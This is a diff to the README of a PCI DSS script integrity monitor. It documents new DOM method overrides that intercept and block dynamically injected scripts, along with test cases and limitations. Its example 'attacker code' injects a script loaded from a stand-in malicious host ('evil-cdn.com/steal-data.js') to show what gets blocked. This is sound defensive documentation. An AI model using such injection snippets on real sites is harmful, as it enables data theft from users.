@@ -10,6 +10,7 @@ Production-ready PCI DSS v4.0 Requirement 6.4.3 compliance solution with automat
 - Comprehensive script inventory with timestamps and metadata
 - Monitoring of static, dynamic, and iframe scripts
 - Support for both enforcement and report-only modes
+- **DOM method overrides** to intercept dynamic script injection (NEW)
 
 ### Enhanced Auto-Detection (NEW)
 - **Automatic detection** of ALL new scripts (never seen before)
@@ -114,6 +115,7 @@ Add to your HTML pages (must be FIRST scripts):
 │  │  - Auto-registers new scripts                             │  │
 │  │  - Polls for approval status                              │  │
 │  │  - Reports violations                                      │  │
+│  │  - Intercepts dynamic script injection (NEW)              │  │
 │  └───────────────────┬──────────────────────────────────────┘  │
 └────────────────────────┼─────────────────────────────────────────┘
                          │ HTTPS/POST
@@ -222,7 +224,9 @@ window.SCRIPT_INTEGRITY_CONFIG = {
   // Hash algorithm
   hashAlgorithm: 'SHA-384',
 
-  // Mode: 'report' or 'enforce'
+  // Mode: 'report' (monitor only) or 'enforce' (block violations)
+  // In enforce mode, blocks: HASH_MISMATCH, SRI_MISMATCH, REJECTED_BY_ADMIN, NO_BASELINE_HASH, UNAUTHORIZED_SCRIPT
+  // Does NOT block: PENDING_APPROVAL, NEW_SCRIPT (allows time for admin review)
   mode: 'report',
 
   // Server integration
@@ -260,6 +264,92 @@ IP_SALT=change-in-production
 
 # See .env.example for all options
 ```
+
+## Dynamic Script Injection Protection
+
+The Script Integrity Monitor includes **DOM method overrides** to intercept and block dynamic script injection attempts. This provides defense-in-depth protection against:
+
+- Malicious third-party scripts injecting additional scripts
+- Browser extensions modifying page behavior
+- XSS attacks attempting to load external malware
+- Supply chain attacks via compromised dependencies
+
+### How It Works
+
+The monitor overrides key DOM methods to intercept script creation and insertion:
+
+```javascript
+// Intercepted methods:
+document.createElement('script')           // Script element creation
+Element.prototype.appendChild()            // Inserting scripts into DOM
+Element.prototype.insertBefore()           // Inserting before reference node
+Element.prototype.replaceChild()           // Replacing elements with scripts
+HTMLScriptElement.src property             // Direct src assignment
+HTMLScriptElement.setAttribute('src')      // Setting src via setAttribute
+```
+
+### Protection Flow
+
+1. **Monitor initializes** → Saves references to original DOM methods
+2. **Overrides installed** → Methods replaced with monitoring wrappers
+3. **Script created/inserted** → Override intercepts the operation
+4. **Approval check** → `shouldBlockDynamicScript()` checks blocked list
+5. **Block or allow**:
+   - **Blocked**: Script type changed to `blocked-by-integrity-monitor`
+   - **Allowed**: Original method called, MutationObserver monitors
+
+### Example: Blocking Malicious Injection
+
+```javascript
+// Attacker code (or compromised third-party script):
+const malware = document.createElement('script');
+malware.src = 'https://evil-cdn.com/steal-data.js';
+document.body.appendChild(malware);
+
+// Result with monitor in enforce mode:
+// ✅ createElement intercepted
+// ✅ appendChild intercepted
+// ✅ Script blocked (type changed to 'blocked-by-integrity-monitor')
+// ✅ Console warning: "🚫 Blocked script via appendChild: https://evil-cdn.com/steal-data.js"
+// ❌ Malware never downloads or executes
+```
+
+### Testing Dynamic Injection Blocking
+
+Open the test page to verify protection:
+
+```bash
+# Start server
+npm start
+
+# Open test page in browser
+http://localhost:3000/test-dynamic-injection.html
+```
+
+The test page includes 7 comprehensive tests:
+1. ✅ `createElement()` + `appendChild()`
+2. ✅ `createElement()` + `insertBefore()`
+3. ✅ `createElement()` + `replaceChild()`
+4. ✅ `setAttribute('src')`
+5. ✅ Direct `src` property assignment
+6. ✅ Inline script via `createElement`
+7. ✅ Script in dynamically created `div`
+
+### Coverage & Limitations
+
+**✅ Protects Against:**
+- External scripts loaded dynamically after monitor initialization
+- Inline scripts created programmatically
+- Scripts injected by third-party code (ads, analytics, widgets)
+- Scripts inserted via any DOM manipulation method
+
+**⚠️ Limitations:**
+- Scripts in original HTML (handled by MutationObserver with timing constraints)
+- Attackers with code execution *before* monitor initialization could save original methods
+- Not a replacement for CSP (use both for defense-in-depth)
+
+**🔒 Best Practice:**
+Load the Script Integrity Monitor as the **first script** on the page, before any other code executes.
 
 ## PCI DSS Compliance
 
